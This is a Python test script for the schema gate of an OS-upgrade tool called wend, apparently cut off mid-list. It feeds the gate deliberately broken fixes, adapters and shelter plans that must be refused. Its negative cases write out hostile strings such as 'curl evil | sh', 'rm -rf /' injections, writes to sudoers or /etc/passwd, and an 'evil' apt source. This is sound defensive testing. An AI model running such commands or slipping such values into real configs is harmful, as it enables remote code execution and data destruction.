"""The gate must say no. Each case is a broken fix the schema check has to refuse.  python3 tools/test_check.py"""
import copy
import os
import sys

sys.dont_write_bytecode = True
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import check  # noqa: E402

adapters, fixes, *_ = check.load_all()
path, good = next((p, d) for p, d in fixes.items() if p.endswith("squeeze/reinstall-mysql-server-5.1-after-hop.toml"))
rel = os.path.relpath(path, check.ROOT)
assert check.check_fix(good, adapters, rel) == [], "the seed fix should pass"

CASES = {
    "stray MySQL: install gated on a file, not on the package it replaces":
        lambda f: f.update(when={"file": "/etc/mysql/my.cnf"}),
    "install gated only under a 'not'": lambda f: f.update(when={"not": {"installed": "mariadb-server"}}),
    "arbitrary shell": lambda f: f["post"].append({"op": "shell", "cmd": "curl x | sh"}),
    "write outside /etc": lambda f: f["post"].append({"op": "write-file", "path": "/usr/bin/dpkg", "content": "x"}),
    "path traversal": lambda f: f["post"].append({"op": "write-file", "path": "/etc/../usr/bin/x", "content": "x"}),
    "write the harness's sources.list": lambda f: f["post"].append(
        {"op": "write-file", "path": "/etc/apt/sources.list", "content": "deb http://evil/ x main\n"}),
    "write a cron job (code execution by the back door)": lambda f: f["post"].append(
        {"op": "write-file", "path": "/etc/cron.d/x", "content": "* * * * * root sh\n"}),
    "write a subdirectory under an allowed glob": lambda f: f["post"].append(
        {"op": "write-file", "path": "/etc/mysql/conf.d/x/y.cnf", "content": "x"}),
    "shell injection in a package name": lambda f: f["post"][0].update(packages=["mysql; rm -rf /"]),
    "unknown force flag": lambda f: f["post"].append(
        {"op": "force-remove", "packages": ["x"], "purge": True, "force": ["all"]}),
    "extra argument smuggled into an op": lambda f: f["post"][0].update(options="--allow-unauthenticated"),
    "hop not on the ladder": lambda f: f.update(hop="sid"),
    "unknown predicate": lambda f: f.update(when={"shell": "true"}),
    "shell through a mysql-option value": lambda f: f.update(when={"all": [f["when"], {"mysql-option": {
        "path": "/etc/my.cnf", "key": "datadir", "value": "x' ; rm -rf / ; '"}}]}),
    "mysql-option outside /etc": lambda f: f.update(when={"all": [f["when"], {"mysql-option": {
        "path": "/root/.my.cnf", "key": "datadir"}}]}),
    "no steps at all": lambda f: (f.pop("post"), f.pop("pre", None)),
}
bad = 0
for name, mutate in CASES.items():
    f = copy.deepcopy(good)
    mutate(f)
    errs = check.check_fix(f, adapters, rel)
    print(("refused " if errs else "MISSED  ") + name + (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
    bad += not errs
# the rpm backend's ops, on a fix built here (the gate must work before the first EL fix lands)
el_good = {"schema": "wend.fix/0", "family": "el", "hop": "alma9", "when": {"installed": "vsftpd"}, "restores": [],
           "adds": [], "post": [{"op": "kv.set", "path": "/etc/vsftpd/vsftpd.conf", "values": {"tcp_wrappers": "NO"}}],
           "meta": {"name": "t"}}
el_rel = "fixes/el/alma9/t.toml"
assert check.check_fix(el_good, adapters, el_rel) == [], check.check_fix(el_good, adapters, el_rel)
EL_CASES = {
    "shell in a service.enable unit": lambda f: f["post"].append(
        {"op": "service.enable", "unit": "httpd;reboot", "like": ["httpd"]}),
    "service.record after the upgrade (the links are gone by then)": lambda f: f["post"].append(
        {"op": "service.record"}),
    "service.enable with nothing to follow": lambda f: f["post"].append(
        {"op": "service.enable", "unit": "httpd", "like": []}),
    "service.enable unit with a leading dash (an option)": lambda f: f["post"].append(
        {"op": "service.enable", "unit": "--global", "like": ["httpd"]}),
    "kv.set on a file that isn't on the writable list": lambda f: f["post"][0].update(path="/etc/sudoers"),
    "shell in a kv.set value": lambda f: f["post"][0].update(values={"listen": "YES; rm -rf /"}),
    "adopt-rpmnew outside the managed list": lambda f: f["post"].append(
        {"op": "rpm.adopt-rpmnew", "paths": ["/etc/cron.d/*"]}),
    "adopt-rpmnew with a glob wider than the managed one": lambda f: f["post"].append(
        {"op": "rpm.adopt-rpmnew", "paths": ["/etc/httpd/*"]}),
    "rpm.transit reinstalling without an installed gate": lambda f: (f.update(when={"file": "/etc/my.cnf"}), f["post"].append(
        {"op": "rpm.transit", "release": "alma8", "remove": "centos-release", "reinstall": ["postfix"]})),
    "rpm.transit to a release it can't bootstrap": lambda f: f["post"].append(
        {"op": "rpm.transit", "release": "alma9", "remove": "centos-release", "reinstall": []}),
    "Debian's force flag on rpm": lambda f: f["post"].append(
        {"op": "force-remove", "packages": ["x"], "purge": True, "force": ["remove-essential"]}),
    "a Debian op on an EL box": lambda f: f["post"].append({"op": "apache.enable", "kind": "mod", "name": "php"}),
    "write the harness's repo directory": lambda f: f["post"].append(
        {"op": "write-file", "path": "/etc/yum.repos.d/x.repo", "content": "[x]\n"}),
    "swap-release installing a server instead of a release package": lambda f: f["post"].append(
        {"op": "rpm.swap-release", "remove": "centos-release", "install": "mysql-server"}),
    "force-remove that drops only the database entry (fakes pkgdb)": lambda f: f["post"].append(
        {"op": "force-remove", "packages": ["mysql-server"], "purge": True, "force": ["db-only"]}),
    "kv.set a key that grants access": lambda f: f["post"][0].update(values={"anon_upload_enable": "YES"}),
    "kv.set on a file with sections": lambda f: f["post"][0].update(path="/etc/my.cnf", values={"old_passwords": "0"}),
    "write the box owner's secrets": lambda f: f["post"].append(
        {"op": "write-file", "path": "/etc/wend/secrets/app-db", "content": "x"}),
    "a predicate that isn't a string": lambda f: f.update(when={"installed": 123}),
    "a value that would read as an option": lambda f: f["post"][0].update(values={"listen": "-x"}),
}
for name, mutate in EL_CASES.items():
    f = copy.deepcopy(el_good)
    mutate(f)
    errs = check.check_fix(f, adapters, el_rel)
    print(("refused " if errs else "MISSED  ") + name + (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
    bad += not errs
# adapters: an adapter can narrow what fixes may do, never widen it past its backend
for name, mutate in {
    "an adapter allowing a force flag its backend doesn't have": lambda a: a.update(force=["depends", "all"]),
    "an adapter op argument that accepts shell": lambda a: a["ops"]["kv.set"]["args"].update(
        values={"table": ".*"}),
    "an adapter declaring an op its backend doesn't implement": lambda a: a["ops"].update(
        {"shell.run": {"summary": "x", "args": {"cmd": {"pattern": "[a-z]+"}}}}),
    "an adapter without a backend": lambda a: a.pop("backend"),
    "an add-on whose vendor would break out of the shell": lambda a: a["addons"]["epel"].update(vendor='x"; rm -rf /'),
    "add-ons that the hops never add to their repo files": lambda a: a["hop"].update(
        set_release=a["hop"]["set_release"].replace(" && {addons}", "")),
    "an add-on repo for a release the adapter doesn't have": lambda a: a["addons"]["epel"]["repos"].update(
        centos4="vault.centos.org/4.9/os/x86_64"),
    "an adapter without hardware requirements (SPEC \"Hardware preflight\")": lambda a: a.pop("hardware"),
    "an adapter whose release asks for an unknown CPU level": lambda a: a["hardware"]["alma9"].update(cpu="v2"),
    "an adapter missing a booted release's hardware": lambda a: a["hardware"].pop("alma10"),
    "an adapter that doesn't say which old kernels a hop keeps in /boot": lambda a: a["hardware"].pop("old_kernels"),
    "an adapter whose release has no /boot footprint": lambda a: a["hardware"]["alma9"].pop("boot_mib"),
    "an adapter without runtime tables (SPEC \"Runtime preflight\")": lambda a: a.pop("runtimes"),
    "an adapter missing a booted release's runtimes": lambda a: a["runtimes"].pop("alma9"),
    "an adapter that doesn't say whether a release ships Python 2": lambda a: a["runtimes"]["alma9"].pop("python2"),
    "an adapter whose Python 2 version isn't a version": lambda a: a["runtimes"]["centos7"].update(python2=["2.7*"]),
    "a relocate table missing a step (SPEC \"Relocate\")": lambda a: a["relocate"].pop("flip"),
    "a relocate table with a step tools/vm.py doesn't run": lambda a: a["relocate"].update(extra=["true"]),
    "a relocate step that's one command, not a list": lambda a: a["relocate"].update(place="true"),
    "a relocate step with no commands": lambda a: a["relocate"].update(copy=[]),
    "a signing key that would break out of the harness's printf (SPEC \"Signed packages\")": lambda a: a["keys"].update(
        {"RPM-GPG-KEY-x": "-----BEGIN PGP PUBLIC KEY BLOCK-----\n'; rm -rf /; '\n-----END PGP PUBLIC KEY BLOCK-----\n"}),
    "a signing key that isn't an armoured public key": lambda a: a["keys"].update({"RPM-GPG-KEY-x": "hello"}),
    "a release checked against a key the adapter doesn't have": lambda a: a["releases"]["alma9"].update(
        gpgkeys=["RPM-GPG-KEY-nobody"]),
    "a release that drops a key by something other than its short id": lambda a: a["releases"]["alma9"].update(
        drop_keys=["3ABB34F8; rm -rf /"]),
    "keys to drop that the hops never drop": lambda a: a["hop"].update(
        after=[c for c in a["hop"]["after"] if c != "{drop_keys}"]),
    "an add-on key for a release the add-on has no repo for": lambda a: a["addons"]["epel"]["gpgkeys"].update(
        centos5="RPM-GPG-KEY-EPEL-8"),
    "signing keys the hops never write": lambda a: a["hop"].update(
        set_release=a["hop"]["set_release"].replace("{keys} && ", "")),
}.items():
    a = copy.deepcopy(adapters["el"])
    mutate(a)
    errs = check.check_adapter(a, "adapters/el.toml")
    print(("refused " if errs else "MISSED  ") + name + (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
    bad += not errs
# apt mirrors land in root shell commands: a URL, or host/path through the shim, and nothing else
for name, mutate in {
    "an apt mirror with shell in it": lambda a: a["releases"].update(archive="http://x.org/debian;reboot"),
    "an apt mirror that isn't http(s)": lambda a: a["releases"].update(current="ftp://ftp.debian.org/debian"),
    "a host/path apt mirror with no shim to go through": lambda a: a.pop("mirror"),
}.items():
    a = copy.deepcopy(adapters["debian"])
    mutate(a)
    errs = check.check_adapter(a, "adapters/debian.toml")
    print(("refused " if errs else "MISSED  ") + name + (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
    bad += not errs
# SPEC "Signed packages", apt: a signed release drops apt_unsigned, so nothing may slip it back in
for name, mutate in {
    "a release that's signed in words, not true or false": lambda a: a["releases"]["buster"].update(signed="yes"),
    "signed releases with no per-hop apt config": lambda a: a["hop"].update(
        set_release=a["hop"]["set_release"].replace("{apt_conf} && ", "")),
    "signed releases with no unsigned lines to drop": lambda a: a["hop"].pop("apt_unsigned"),
    "an apt config that would break out of the harness's printf": lambda a: a["hop"].update(
        apt_conf=a["hop"]["apt_conf"] + "'; rm -rf /; '"),
}.items():
    a = copy.deepcopy(adapters["debian"])
    mutate(a)
    errs = check.check_adapter(a, "adapters/debian.toml")
    print(("refused " if errs else "MISSED  ") + name + (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
    bad += not errs
a = copy.deepcopy(adapters["debian"])  # an apt cache on its own port is a mirror like any other
a["releases"]["current"] = "http://apt-cache.internal:3142/debian"
errs = check.check_adapter(a, "adapters/debian.toml")
print(("passed  " if not errs else "WRONG   ") + "an apt mirror URL with a port" + (f" ({errs})" if errs else ""))
bad += bool(errs)
# a release's driver table is pinned: other bytes under its name, or none, fail the atlas
a = copy.deepcopy(adapters["el"])
a["hardware"]["alma9"]["drivers"] = "sha256:" + "0" * 64
errs = check.driver_table_errors("el", a, "adapters/el.toml")
print(("refused " if errs else "MISSED  ") + "a driver table that isn't the pinned one" +
      (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
bad += not errs
# a pattern can dodge any finite probe, so values are also held to a fixed safe set, whatever the adapter says
loose = copy.deepcopy(adapters)
loose["el"]["ops"]["kv.set"]["args"]["values"] = {"table": "x[a-z;|&$ ]*"}
f = copy.deepcopy(el_good)
f["post"][0]["values"] = {"listen": "x;rm"}
errs = check.check_fix(f, loose, el_rel)
print(("refused " if errs else "MISSED  ") + "shell through a loose adapter pattern" +
      (f"  ({errs[0].split(': ', 1)[1]})" if errs else ""))
bad += not errs
for fam, a in adapters.items():
    errs = check.check_adapter(a, f"adapters/{fam}.toml")
    print(("passed  " if not errs else "WRONG   ") + f"adapters/{fam}.toml" + (f" ({errs})" if errs else ""))
    bad += bool(errs)
# rpm names carry capitals: installing NetworkManager and enabling its unit must pass, a capitalized name with shell in
# it must not
nm = {**el_good, "when": {"installed": "initscripts"}, "adds": ["NetworkManager"], "post": [
    {"op": "install", "packages": ["NetworkManager"]},
    {"op": "service.enable", "unit": "NetworkManager", "like": ["network"]}]}
for name, fix, want in (("NetworkManager install and enable", nm, False),
                        ("an underscore in a package name (mod_ssl)", {**nm, "adds": [], "post": [
                            {"op": "install", "packages": ["mod_ssl"]}]}, False),
                        ("a package name starting with an underscore", {**nm, "post": [
                            {"op": "install", "packages": ["_x"]}]}, True),
                        ("shell in a capitalized package name", {**nm, "post": [
                            {"op": "install", "packages": ["NetworkManager;reboot"]}]}, True),
                        ("shell in a capitalized unit", {**nm, "post": [
                            {"op": "service.enable", "unit": "NetworkManager$(id)", "like": ["network"]}]}, True)):
    errs = check.check_fix(fix, adapters, "fixes/el/alma9/t.toml")
    print(("refused " if errs else "passed  ") + name if bool(errs) == want else f"WRONG   {name} {errs}")
    bad += bool(errs) != want
# adds: a family, never shell; the harness records the fired fixes' families after the post steps (SPEC "restores and adds").
# The same command string is asserted in client/src/hop.rs's tests, so both engines write it byte for byte.
# A fix may only declare the family of a package its own steps install (Codex review of #28: no self-attested
# allow-list).
for name, adds, want in (("adds the family of a package the fix installs", ["NetworkManager"], False),
                         ("adds a family the fix doesn't install", ["vsftpd"], True),
                         ("shell in adds", ["x' >> /etc/passwd; '"], True),
                         ("digits in adds (not a family)", ["php5"], True),
                         ("adds not a list", "NetworkManager", True)):
    errs = check.check_fix({**nm, "adds": adds}, adapters, "fixes/el/alma9/t.toml")
    print(("refused " if errs else "passed  ") + name if bool(errs) == want else f"WRONG   {name} {errs}")
    bad += bool(errs) != want
# how a package's family is derived: digits and dots go, nothing from the first "-" on; pre and post steps and a
# transit's reinstall all count
_inst = lambda ph, pkgs, adds: {**nm, "adds": adds, "post": [], "pre": [], ph: [{"op": "install", "packages": pkgs}]}  # noqa: E731
_tr = {**nm, "adds": ["mariadb"], "post": [], "pre": [{"op": "rpm.transit", "release": "alma8", "remove": "centos-release",
                                                       "reinstall": ["mariadb-server"]}]}
for name, fix, want in (("adds php for php-fpm", _inst("post", ["php-fpm"], ["php"]), False),
                        ("adds mysql for mysql55", _inst("post", ["mysql55"], ["mysql"]), False),
                        ("adds php-fpm (not a family)", _inst("post", ["php-fpm"], ["php-fpm"]), True),
                        ("adds for an install in a pre step", _inst("pre", ["NetworkManager"], ["NetworkManager"]), False),
                        ("adds for a transit's reinstall", _tr, False)):
    errs = check.check_fix(fix, adapters, "fixes/el/alma9/t.toml")
    print(("refused " if errs else "passed  ") + name if bool(errs) == want else f"WRONG   {name} {errs}")
    bad += bool(errs) != want
import walk  # noqa: E402
w = type("W", (), {})()
w.adapter = adapters["el"]
_ins = lambda adds: {**el_good, "adds": adds, "post": [{"op": "install", "packages": adds}] + el_good["post"]}  # noqa: E731
cmds = walk.Walk.hop_cmds(w, "alma9", [_ins(["polkit", "NetworkManager"]), _ins(["polkit"])])
want = "mkdir -p /var/lib/wend && printf 'NetworkManager\\npolkit\\n' >> /var/lib/wend/added-families"
ok = want in cmds and cmds.index(want) > max(i for i, c in enumerate(cmds) if "kv" in c or "vsftpd" in c)
print(("passed  " if ok else "WRONG   ") + "the hop records the fired fixes' adds after their post steps")
bad += not ok
try:  # a direct `wend replay` doesn't run check_fix first: the compile refuses a non-family itself
    walk.Walk.hop_cmds(w, "alma9", [_ins(["x' ; reboot ; '"])])
    print("WRONG   the hop compile accepted shell in adds")
    bad += 1
except ValueError:
    print("refused shell in adds at hop compile")
try:  # nor a family the fix doesn't install
    walk.Walk.hop_cmds(w, "alma9", [{**el_good, "adds": ["vsftpd"]}])
    print("WRONG   the hop compile accepted adds for a family the fix doesn't install")
    bad += 1
except ValueError:
    print("refused adds the fix doesn't install, at hop compile")
try:
    walk.Walk.hop_cmds(w, "alma9", [{**el_good, "adds": "NetworkManager"}])
    print("WRONG   the hop compile accepted a non-list adds")
    bad += 1
except ValueError:
    print("refused a non-list adds at hop compile")
el_route = {"schema": "wend.route/0", "family": "el", "from": "centos5", "to": "alma10", "fixes": []}
for hops, want in ((["centos6", "centos7", "alma9", "alma10"], True), (["centos6", "alma9", "alma10"], False),
                   (["centos6", "centos7", "alma8", "alma9", "alma10"], True), (["centos7", "centos6", "alma10"], False)):
    ok = not check.check_route({**el_route, "hops": hops}, {}, adapters, "routes/el/x.toml")
    print(("passed  " if ok else "refused ") + f"route hops {hops}" if ok == want else f"WRONG   route hops {hops}")
    bad += ok != want

# decoys: the MySQL fix firing on the web box must fail; the honest run must pass
import json  # noqa: E402
_, fixes_, routes_, _, runs_ = check.load_all()
route = next(r for r in routes_.values() if r["family"] == "debian")
rid, by_id = check.content_id(route), {check.content_id(d): d for d in fixes_.values()}
path_, web_run = next((p, r) for p, r in runs_.items() if r["box"] == "debian/etch-web" and r["route"] == rid)
fake = json.loads(json.dumps(web_run))
next(h for h in fake["hops"] if h["to"] == "squeeze")["fired"].append(check.content_id(good))
for name, run, want in (("decoy hit: the MySQL fix fired on the web box", fake, True),
                        ("honest web run has no decoy errors", web_run, False)):
    got = bool(check.decoy_errors({path_: run}, {rid: route}, by_id))
    print(("refused " if got else "passed  ") + name if got == want else "WRONG   " + name)
    bad += got != want
# pairing: CI replays a route only on boxes that start at its `from`, so neither a route nor a claim may go unreplayed
_, _, _, boxes_, _ = check.load_all()
rpath = next(p for p, r in routes_.items() if r is route)
claimed = next(d for d in fixes_.values() if check.content_id(d) in {x["id"] for x in route["fixes"]}
               and d["meta"].get("fires_on"))
cpath = next(p for p, d in fixes_.items() if d is claimed)
moved = {b: ({**d, "release": "lenny"} if b == claimed["meta"]["fires_on"][0] else d) for b, d in boxes_.items()}
for name, args, want in (
        ("a route that starts where no box starts", ({rpath: {**route, "from": "lenny"}}, boxes_, {}), True),
        ("a fires_on box that starts where no route pinning the fix starts", ({rpath: route}, moved, {cpath: claimed}),
         True),
        ("a fires_on box that is not a box",
         ({rpath: route}, boxes_, {cpath: {**claimed, "meta": {**claimed["meta"], "fires_on": ["debian/no"]}}}), True),
        ("the real routes, boxes and claims", (routes_, boxes_, fixes_), False)):
    got = bool(check.pairing_errors(*args))
    print(("refused " if got else "passed  ") + name if got == want else "WRONG   " + name)
    bad += got != want
assert check.content_id(good) != check.content_id({**good, "when": {"installed": "x"}})
assert check.content_id(good) == check.content_id({**good, "meta": {"name": "renamed"}}), "meta must not change ids"
print("ids: content changes the id, renaming does not")
# SPEC "How a hop runs": every command that touches a root sets umask 022 first (a 077 caller made the mysqli shim
# unreadable to php-fpm on AlmaLinux 10, wend#13). Both engines, checked by structure: CI's own umask is 022.
import ast  # noqa: E402
import re  # noqa: E402
tree = ast.parse(open(os.path.join(check.ROOT, "wend")).read())
fns = {n.name: n for n in tree.body if isinstance(n, ast.FunctionDef)}
# root_umask() sets 022 and puts the caller's mask back in a finally. Checked statically: the gate's schema job judges a
# PR with the base branch's tools and never runs the PR's own `wend` (tools/test_umask.py does that, in the client job
# and `wend check`)
fn = fns.get("root_umask")
body = [b for b in fn.body if not (isinstance(b, ast.Expr) and isinstance(b.value, ast.Constant))] if fn else []
ok = (fn is not None and [ast.unparse(d) for d in fn.decorator_list] == ["contextlib.contextmanager"]
      and len(body) == 2 and ast.unparse(body[0]) == "old = os.umask(18)"  # 18 == 0o022
      and isinstance(body[1], ast.Try) and [ast.unparse(x) for x in body[1].body] == ["yield"]
      and [ast.unparse(x) for x in body[1].finalbody] == ["os.umask(old)"] and not body[1].handlers)
print(("passed  " if ok else "WRONG   ") + "wend root_umask() sets 022 and restores the caller's mask in a finally")
bad += not ok

def walk_under_mask(fn):
    """Walk(...) is built only inside `with root_umask():`, and the run and step files are written outside it."""
    withs = [n for n in ast.walk(fn) if isinstance(n, ast.With) and any(
        isinstance(i.context_expr, ast.Call) and getattr(i.context_expr.func, "id", "") == "root_umask" for i in n.items)]
    inside = {id(x) for w in withs for x in ast.walk(w)}
    walks = [n for n in ast.walk(fn) if isinstance(n, ast.Call) and getattr(n.func, "attr", "") == "Walk"]
    writes = [n for n in ast.walk(fn) if isinstance(n, ast.Call) and (getattr(n.func, "id", "") == "save_run" or
                                                                       getattr(n.func, "attr", "") == "dump")]
    return bool(withs) and bool(walks) and all(id(x) in inside for x in walks) and all(id(x) not in inside for x in writes)


for name in ("cmd_replay", "cmd_discover"):  # every command that walks a root; a missing one fails
    ok = name in fns and walk_under_mask(fns[name])
    print(("passed  " if ok else "WRONG   ") + f"wend {name} walks under umask 022, writes its files under the caller's")
    bad += not ok
rs = open(os.path.join(check.ROOT, "client", "src", "main.rs")).read()
walk = rs[rs.index("fn cmd_walk("):]
walk = walk[:walk.index("\n}\n")]
walk = re.sub(r"/\*.*?\*/", "", walk, flags=re.S)  # comments don't count
code = "\n".join(ln.split("//")[0].strip() for ln in walk.split("\n")[1:])
body = [ln for ln in code.split("\n") if ln]
ok = (body[0] == "let mask = RootUmask::set();" and "drop(mask);" in code
      and code.index("drop(mask);") < code.index("&o.steps") < code.index("&o.out"))
print(("passed  " if ok else "WRONG   ") + "client cmd_walk walks under RootUmask, drops it before --steps and --out")
bad += not ok
# a box's [vm] table (tools/vm.py): only ssh_port, skip, live, pockets and root_fs, each well formed
web = check.load_all()[3]["el/centos5-web"]
for name, vm, want in (("the web box's own [vm]", web.get("vm", {}), False),
                       ("[vm] skip names a role the box doesn't have", {**web["vm"], "skip": ["dbb"]}, True),
                       ("[vm] skip holds a list", {**web["vm"], "skip": [["db"]]}, True),
                       ("[vm] ssh_port as a bool", {**web["vm"], "ssh_port": True}, True),
                       ("[vm] ssh_port out of range", {**web["vm"], "ssh_port": 70000}, True),
                       ("[vm] an empty live check", {**web["vm"], "live": {"x": ""}}, True),
                       ("[vm] an unknown key", {**web["vm"], "hostname": "x"}, True),
                       ("[vm] root_fs on a release whose installer offers none (CentOS 5)", {**web["vm"], "root_fs": "ext3"},
                        True),
                       ("[vm] a skipped role with no live check", {**web["vm"], "live": {"site": web["vm"]["live"]["site"]}},
                        True),
                       # bash reads the ' inside "${C:-...}" as a quote; dash doesn't (wend#91's cron check on remi)
                       ("[vm] a live check bash can't parse", {**web["vm"], "live": {
                           **web["vm"]["live"], "x": "echo \"ran: ${C:-the timer's service}\""}}, True),
                       ("[vm] a live check only bash parses (it runs in bash)", {**web["vm"], "live": {
                           **web["vm"]["live"], "x": "f() { echo; }; [[ -n $x ]] && f <<< y"}}, False)):
    errs = check.check_box({**web, "vm": vm}, adapters, "boxes/el/centos5-web/box.toml")
    print(("refused " if errs else "passed  ") + name if bool(errs) == want else f"WRONG   {name} {errs}")
    bad += bool(errs) != want
# a box's [shelter.<app>] plan (SPEC "Sheltering an app"): every value lands in root commands and unit files
py = check.load_all()[3]["el/centos7-lamp"]  # any EL7 box: the plan below is what el/centos7-pyapp carries
plan = {"code": "/opt/billing", "data": ["/var/lib/billing"], "user": "billing", "unit": "billing.service",
        "cron": [{"user": "billing", "line": "30 2 * * * /usr/bin/python /opt/billing/nightly.py"}],
        "sockets": ["/var/lib/mysql/mysql.sock"], "ports": ["127.0.0.1:8080"]}
cron0 = plan["cron"][0]
for name, sh, want in (
        ("the pyapp box's own plan", {"billing": plan}, False),
        ("shelter: not a table of apps", {"code": "/opt/billing"}, True),
        ("shelter: an app name with a space", {"bill ing": plan}, True),
        ("shelter: an unknown key (a privileged container)", {"billing": {**plan, "privileged": True}}, True),
        ("shelter: no unit", {"billing": {k: v for k, v in plan.items() if k != "unit"}}, True),
        ("shelter: shell in the unit name", {"billing": {**plan, "unit": "billing.service;reboot"}}, True),
        ("shelter: a unit that is wend's own", {"billing": {**plan, "unit": "wend-shelter-billing.service"}}, True),
        ("shelter: a relative code tree", {"billing": {**plan, "code": "opt/billing"}}, True),
        ("shelter: the code tree is /usr", {"billing": {**plan, "code": "/usr/lib/python2.7"}}, True),
        ("shelter: traversal in a data dir", {"billing": {**plan, "data": ["/var/lib/../../etc"]}}, True),
        ("shelter: /etc as a data dir", {"billing": {**plan, "data": ["/etc"]}}, True),
        ("shelter: data inside the code tree", {"billing": {**plan, "data": ["/opt/billing/state"]}}, True),
        ("shelter: data as a string", {"billing": {**plan, "data": "/var/lib/billing"}}, True),
        ("shelter: running as root", {"billing": {**plan, "user": "root"}}, True),
        ("shelter: shell in a cron line", {"billing": {**plan, "cron": [
            {**cron0, "line": cron0["line"] + "; curl evil | sh"}]}}, True),
        ("shelter: a cron line with % (a newline to cron)", {"billing": {**plan, "cron": [
            {**cron0, "line": "30 2 * * * /bin/date +%s"}]}}, True),
        ("shelter: @reboot (no timer for it yet)", {"billing": {**plan, "cron": [
            {**cron0, "line": "@reboot /usr/bin/python /opt/billing/nightly.py"}]}}, True),
        ("shelter: a stepped range (doesn't translate exactly)", {"billing": {**plan, "cron": [
            {**cron0, "line": "1-30/5 2 * * * /usr/bin/python /opt/billing/nightly.py"}]}}, True),
        ("shelter: a cron line with a bare command", {"billing": {**plan, "cron": [
            {**cron0, "line": "30 2 * * * python /opt/billing/nightly.py"}]}}, True),
        ("shelter: a cron line of another user", {"billing": {**plan, "cron": [{**cron0, "user": "alice"}]}}, True),
        ("shelter: a cron line as a string", {"billing": {**plan, "cron": [cron0["line"]]}}, True),
        ("shelter: a relative socket", {"billing": {**plan, "sockets": ["mysql.sock"]}}, True),
        ("shelter: a port out of range", {"billing": {**plan, "ports": ["127.0.0.1:99999"]}}, True),
        ("shelter: a port with no address", {"billing": {**plan, "ports": [8080]}}, True),
        ("shelter: a port on every address", {"billing": {**plan, "ports": ["0.0.0.0:80"]}}, False),
        ("shelter: a port on one of the host's own addresses (absent in the shelter)",
         {"billing": {**plan, "ports": ["10.0.2.20:8080"]}}, True),
        ("shelter: an egress opt-in", {"billing": {**plan, "egress": ["192.0.2.10:443"]}}, False),
        ("shelter: egress as a host name", {"billing": {**plan, "egress": ["api.example.com:443"]}}, True),
        ("shelter: egress with shell", {"billing": {**plan, "egress": ["192.0.2.10:443; reboot"]}}, True)):
    errs = check.check_box({**py, "shelter": sh}, adapters, "boxes/el/centos7-lamp/box.toml")
    print(("refused " if errs else "passed  ") + name if bool(errs) == want else f"WRONG   {name} {errs}")
    bad += bool(errs) != want
# cron schedules as timers: both day fields restricted means either, unless one starts with * (cronie: both)
import shelter  # noqa: E402
for line, want in (("30 2 1,15 * 1 /x", ["*-*-01,15 02:30:00", "Mon *-*-* 02:30:00"]),
                   ("30 2 */2 * 1 /x", ["Mon *-*-1/2 02:30:00"]),
                   ("30 2 * * mon-fri /x", ["Mon,Tue,Wed,Thu,Fri *-*-* 02:30:00"])):
    got = shelter.cron_calendar(line)[0]
    print(("passed  " if got == want else f"WRONG   {got} ") + f"cron {line!r}")
    bad += got != want
# the VM tier's confinement probe and SELinux window (tools/vm.py) are shell for the guest's bash: they must parse, and
# a destination the plan opted in to can't stand for one the shelter must not reach
import subprocess as _sp  # noqa: E402
_pyplan = check.load_all()[3]["el/centos7-pyapp"]["shelter"]["billing"]
for name, script in (("vm_probe", shelter.vm_probe("billing", _pyplan, "10.0.2.2:8085")),
                     ("vm_probe, low port and egress", shelter.vm_probe("billing", {**_pyplan, "ports": ["0.0.0.0:80"],
                                                                                    "egress": ["192.0.2.10:443"]},
                                                                         "10.0.2.2:8085")),
                     ("vm_probe, no data", shelter.vm_probe("billing", {**_pyplan, "data": []}, "10.0.2.2:8085")),
                     ("vm_enforce_on", shelter.vm_enforce_on("billing")), ("VM_ENFORCE_OFF", shelter.VM_ENFORCE_OFF)):
    r = _sp.run(["bash", "-n"], input=script, text=True, capture_output=True)
    print(("passed  " if r.returncode == 0 else f"WRONG   {r.stderr[:300]} ") + f"{name} parses")
    bad += r.returncode != 0
try:
    shelter.vm_probe("billing", {**_pyplan, "egress": ["10.0.2.2:8085"]}, "10.0.2.2:8085")
    print("WRONG   vm_probe took an opted-in destination as the one to refuse")
    bad += 1
except ValueError:
    print("refused vm_probe with an opted-in destination as the one to refuse")
_den = shelter.vm_denials("billing", "type=AVC msg=audit(1.2:3): avc:  denied  { connectto } for pid=9 comm=\"python\" "
                          "scontext=system_u:system_r:container_t:s0:c1,c2 tcontext=system_u:system_r:unconfined_service_t:s0\n"
                          "type=AVC msg=audit(1.2:4): avc:  denied  { read } for pid=7 comm=\"tuned\" scontext=system_u:"
                          "system_r:tuned_t:s0 tcontext=system_u:object_r:var_t:s0")
print(("passed  " if len(_den) == 1 and "connectto" in _den[0] else f"WRONG   {_den} ") +
      "vm_denials keeps the shelter's denials only")
bad += not (len(_den) == 1 and "connectto" in _den[0])
# root_fs is one the box's start release's installer makes (releases.<release>.install.root_fs)
lamp, trusty = check.load_all()[3]["el/centos7-lamp"], check.load_all()[3]["ubuntu/trusty-web"]
for name, box, root_fs, want in (("[vm] root_fs xfs-v4 on CentOS 7", lamp, "xfs-v4", False),
                                 ("[vm] root_fs xfs on CentOS 7", lamp, "xfs", False),
                                 ("[vm] an unknown root_fs on CentOS 7", lamp, "btrfs", True),
                                 ("[vm] root_fs on a debian-installer box", trusty, "xfs", True)):
    errs = check.check_box({**box, "vm": {**box["vm"], "root_fs": root_fs}}, adapters, "boxes/x/box.toml")
    print(("refused " if errs else "passed  ") + name if bool(errs) == want else f"WRONG   {name} {errs}")
    bad += bool(errs) != want
# [vm].pockets: the -updates/-security/-backports pockets a box built from them asks the VM installer for (wend#47)
tweb = check.load_all()[3]["ubuntu/trusty-web"]
for name, box, want in (("[vm] pockets on a release_pocket_only release", {**tweb, "vm": {**tweb["vm"], "pockets": ["updates", "security"]}}, False),
                        ("[vm] pockets naming backports", {**tweb, "vm": {**tweb["vm"], "pockets": ["updates", "security", "backports"]}}, False),
                        ("[vm] pockets with updates alone", {**tweb, "vm": {**tweb["vm"], "pockets": ["updates"]}}, False),
                        ("[vm] pockets without updates, which the installer's sources.list always has",
                         {**tweb, "vm": {**tweb["vm"], "pockets": ["security", "backports"]}}, True),
                        ("[vm] pockets naming proposed", {**tweb, "vm": {**tweb["vm"], "pockets": ["proposed"]}}, True),
